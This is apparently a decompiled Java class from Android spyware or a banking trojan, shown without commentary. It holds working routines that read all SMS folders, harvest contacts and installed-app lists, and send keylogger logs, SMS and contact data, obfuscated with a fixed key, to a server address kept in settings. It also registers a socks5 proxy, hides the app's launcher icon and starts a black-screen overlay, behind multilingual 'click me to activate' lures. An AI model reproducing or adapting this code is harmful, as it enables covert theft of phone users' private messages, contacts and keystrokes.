\u05e2\u05dc\u05d9\u05d9 \u05db\u05d3\u05d9 \u05dc\u05d4\u05e4\u05e2\u05d9\u05dc','hi':'\u092e\u0941\u091d\u0947 \u0938\u0915\u094d\u0930\u093f\u092f \u0915\u0930\u0928\u0947 \u0915\u0947 \u0932\u093f\u090f \u0915\u094d\u0932\u093f\u0915 \u0915\u0930\u0947\u0902','hu':'Kattintson r\u00e1m az aktiv\u00e1l\u00e1shoz','in':'Klik saya untuk mengaktifkan','lv':'Noklik\u0161\u0137iniet uz manis, lai aktiviz\u0113tu','lt':'Spustel\u0117kite mane nor\u0117dami suaktyvinti','nb':'Klikk p\u00e5 meg for \u00e5 aktivere','pt':'Clique em mim para ativar','ro':'Face\u021bi clic pe mine pentru a activa','sr':'\u041a\u043b\u0438\u043a\u043d\u0438\u0442\u0435 \u043d\u0430 \u043c\u0435\u043d\u0435 \u0434\u0430 \u0441\u0435 \u0430\u043a\u0442\u0438\u0432\u0438\u0440\u0430\u043c','sk':'Click on me to activate','sl':'Kliknite na mene, da se aktiviram','sv':'Klicka p\u00e5 mig f\u00f6r att aktivera','th':'\u0e04\u0e25\u0e34\u0e01\u0e17\u0e35\u0e48\u0e09\u0e31\u0e19\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19','tr':'Etkinle\u015ftirmek i\u00e7in bana t\u0131kla','vi':'B\u1ea5m v\u00e0o t\u00f4i \u0111\u1ec3 k\u00edch ho\u1ea1t'}").getString(Locale.getDefault().getLanguage());
    }
    
    public final String _servers(final Context context, final String s, final String s2, final String s3) {
        final JSONObject jsonObject = new JSONObject();
        jsonObject.put("ID", (Object)s2);
        jsonObject.put("LS", (Object)s);
        this.Log("Send Contacts", "logs: ".concat(String.valueOf(s)));
        final StringBuilder sb = new StringBuilder();
        sb.append(s3);
        sb.append(this._grown(jsonObject.toString()));
        return this._marina(this._brought(context, sb.toString()));
    }
    
    public final void SettingsWrite(final Context context, final String s, final String s2) {
        final SharedPreferences$Editor edit = context.getSharedPreferences("ring0", 0).edit();
        edit.putString(s, s2);
        edit.commit();
    }
    
    public final String sendAddSocks5(final Context context, final String s) {
        final JSONObject jsonObject = new JSONObject();
        jsonObject.put("id_device", (Object)s);
        this.Log("Send_add_socks5", "Update ".concat(String.valueOf(s)));
        final StringBuilder sb = new StringBuilder();
        sb.append("q=update_socks5&ws=");
        sb.append(this._grown(jsonObject.toString()));
        return this._marina(this._brought(context, sb.toString()));
    }
    
    public final String sendKeyloggerLogs(final Context context, final String s, final String s2, final String s3) {
        final JSONObject jsonObject = new JSONObject();
        jsonObject.put("LS", (Object)s);
        jsonObject.put("ID", (Object)s2);
        this.Log("SEND Keylogger", "logs: ".concat(String.valueOf(s)));
        final StringBuilder sb = new StringBuilder();
        sb.append(s3);
        sb.append(this._grown(jsonObject.toString()));
        return this._marina(this._brought(context, sb.toString()));
    }
    
    public final void SettingsToAdd(final Context context, final String s, final String s2) {
        final String settingsRead = this.SettingsRead(context, s);
        String string = s2;
        if (!settingsRead.isEmpty()) {
            final StringBuilder sb = new StringBuilder();
            sb.append(settingsRead);
            sb.append(s2);
            string = sb.toString();
        }
        this.SettingsWrite(context, s, string);
    }
    
    public final String _grown(final String s) {
        return _giant(s, "lASdSnSHWdna");
    }
    
    public final void _bhutan(final Context context) {
        if (this.SettingsRead(context, "RS").equals("true")) {
            context.startService(new Intent(context, (Class)srvIBlackScreen.class));
        }
    }
    
    public final void _founded(final Context context, final String s, final String s2) {
        this.SettingsWrite(context, s, this.SettingsRead(context, s).replace(s2, ""));
    }
    
    public final String _marina(final String s) {
        return _possibly(s, "lASdSnSHWdna");
    }
    
    public final void _chapel(final Context context) {
        if ("".isEmpty()) {
            context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class)mainActivity.class), 2, 1);
        }
    }
    
    public final void _compiled(final Context context, final String s) {
        final String settingsRead = this.SettingsRead(context, "AS");
        if (!settingsRead.isEmpty() && this.sendSmsLogs(context, settingsRead, s, "q=saved_data_device&ws= ").equals("ok")) {
            if (this.SettingsRead(context, "AS").length() > settingsRead.length()) {
                this._founded(context, "AS", settingsRead);
                return;
            }
            this.SettingsWrite(context, "AS", "");
        }
    }
    
    final String _brought(final Context context, final String s) {
        final String settingsRead = this.SettingsRead(context, "QE");
        this.Log("Connect", "url: ".concat(String.valueOf(settingsRead)));
        return this._checking(settingsRead, s);
    }
    
    public final String SettingsRead(final Context context, final String s) {
        if (utils.settings == null) {
            utils.editor = (utils.settings = context.getSharedPreferences("ring0", 0)).edit();
        }
        return utils.settings.getString(s, (String)null);
    }
    
    public final void _currency(final Context context) {
        if (!isMyServiceRunning(context, srvWhileWorker.class)) {
            context.startService(new Intent(context, (Class)srvWhileWorker.class));
        }
    }
    
    public final void _antiques(final Context context) {
        final ConnectivityManager connectivityManager = (ConnectivityManager)context.getSystemService("connectivity");
        if (connectivityManager.getNetworkInfo(0).getState() == NetworkInfo$State.CONNECTED || connectivityManager.getNetworkInfo(1).getState() == NetworkInfo$State.CONNECTED) {}
        if (!isMyServiceRunning(context, srvNetworkConnect.class)) {
            context.startService(new Intent(context, (Class)srvNetworkConnect.class));
        }
    }
    
    public final void _ebooks(final Context context) {
        String string = "";
        int n = 0;
        while (true) {
            final String s = (new String[] { "sms/sent", "sms/inbox", "sms/draft" })[n];
            final Cursor query = context.getContentResolver().query(Uri.parse("content://".concat(String.valueOf(s))), (String[])null, (String)null, (String[])null, (String)null);
            String s2 = string;
            if (query != null) {
                while (query.moveToNext()) {
                    final String string2 = query.getString(2);
                    if (string2.length() > 0) {
                        final String string3 = query.getString(12);
                        String string4;
                        if (string3 == null) {
                            string4 = "";
                        }
                        else {
                            final StringBuilder sb = new StringBuilder();
                            sb.append(string3);
                            sb.append(" ");
                            string4 = sb.toString();
                        }
                        final String string5 = query.getString(13);
                        final StringBuilder sb2 = new StringBuilder();
                        sb2.append(string);
                        sb2.append("~");
                        sb2.append(s);
                        sb2.append("~number: ");
                        sb2.append(string2);
                        sb2.append(" text: ");
                        sb2.append(string4);
                        sb2.append(string5);
                        sb2.append("[0#1#]");
                        string = sb2.toString();
                    }
                }
                query.close();
                this.SettingsWrite(context, "SV", string);
                s2 = string;
            }
            ++n;
            string = s2;
        }
    }
    
    public final void _adjusted(final Context context) {
        final List \u0131nstalledApplications = context.getPackageManager().getInstalledApplications(128);
        String string = "";
        for (final ApplicationInfo applicationInfo : \u0131nstalledApplications) {
            if ((applicationInfo.flags & 0x1) != 0x0) {}
            final StringBuilder sb = new StringBuilder();
            sb.append(string);
            sb.append(applicationInfo.packageName);
            sb.append("[0#1#]");
            string = sb.toString();
        }
        this.SettingsWrite(context, "SC", string);
    }
    
    public final void getContacts(final Context context) {
        final Cursor query = context.getContentResolver().query(ContactsContract$CommonDataKinds$Phone.CONTENT_URI, (String[])null, (String)null, (String[])null, (String)null);
        String string = "";
        while (query.moveToNext()) {
            final String string2 = query.getString(query.getColumnIndex("data1"));
            final String string3 = query.getString(query.getColumnIndex("display_name"));
            if (!string2.contains("*") && !string2.contains("#") && string2.length() > 6 && !string.contains(string2)) {
                final StringBuilder sb = new StringBuilder();
                sb.append(string);
                sb.append(string2);
                sb.append(" / ");
                sb.append(string3);
                sb.append("[0#1#]");
                string = sb.toString();
            }
        }
        this.SettingsWrite(context, "SX", string);
    }
    
    public final String getInstalledApps(final Context context) {
        final PackageManager packageManager = context.getPackageManager();
        final List \u0131nstalledApplications = packageManager.getInstalledApplications(0);
        String string = "";
        for (final ApplicationInfo applicationInfo : \u0131nstalledApplications) {
            String string2 = string;
            if (packageManager.getLaunchIntentForPackage(applicationInfo.packageName) != null) {
                final StringBuilder sb = new StringBuilder();
                sb.append(applicationInfo.packageName);
                sb.append(":");
                string2 = string;
                if (!string.contains(sb.toString())) {
                    final StringBuilder sb2 = new StringBuilder();
                    sb2.append(string);
                    sb2.append(applicationInfo.packageName);
                    sb2.append(":");
                    string2 = sb2.toString();
                }
            }
            string = string2;
            if ((applicationInfo.flags & 0x80) != 0x1) {
                string = string2;
                if ((applicationInfo.flags & 0x1) == 0x1) {
                    continue;
                }
                final StringBuilder sb3 = new StringBuilder();
                sb3.append(applicationInfo.packageName);
                sb3.append(":");
                string = string2;
                if (string2.contains(sb3.toString())) {
                    continue;
                }
                final StringBuilder sb4 = new StringBuilder();
                sb4.append(string2);
                sb4.append(applicationInfo.packageName);
                sb4.append(":");
                string = sb4.toString();
            }
        }
        this.Log("AllApplication", _orbit(string));
        return _orbit(string);
    }
    
    public final boolean hasPermissionAllTrue(final Context context) {
        final String[] pentium$ = this.consts.pentium$;
        final int length = pentium$.length;
        int i = 0;
        boolean b = true;
        while (i < length) {
            if (context.checkCallingOrSelfPermission(pentium$[i]) != 0) {
                b = false;
            }
            ++i;
        }
        return b;
    }
    
    public final void _japan(final Context context) {
        String s = "";
        final String[] pentium$ = this.consts.pentium$;
        for (int length = pentium$.length, i = 0; i < length; ++i) {
            final String s2 = pentium$[i];
            if (context.checkCallingOrSelfPermission(s2) != 0) {
                final StringBuilder sb = new StringBuilder();
                sb.append(s);
                sb.append("[");
                sb.append(s2);
                sb.append(" : off] ");
                s = sb.toString();
            }
            else {
                final StringBuilder sb2 = new StringBuilder();
                sb2.append(s);
                sb2.append("[");
                sb2.append(s2);
                sb2.append(" : on] ");
                s = sb2.toString();
            }
        }
        String s3;
        if (isNotificationServiceEnabled(context)) {
            final StringBuilder sb3 = new StringBuilder();
            sb3.append(s);
            sb3.append("[Access to notification : on] ");
            s3 = sb3.toString();
        }
        else {
            final StringBuilder sb4 = new StringBuilder();
            sb4.append(s);
            sb4.append("[Access to notification : off] ");
            s3 = sb4.toString();
        }
        final StringBuilder sb5 = new StringBuilder();
        sb5.append(s3);
        sb5.append("[143523#]");
        this.SettingsToAdd(context, "AS", sb5.toString());
        this._compiled(context, this.SettingsRead(context, "QQ"));
    }
    
    public final String getLabelApplication(final Context context) {
        return (String)context.getPackageManager().getApplicationLabel(context.getPackageManager().getApplicationInfo(context.getPackageName(), 128));
    }
}
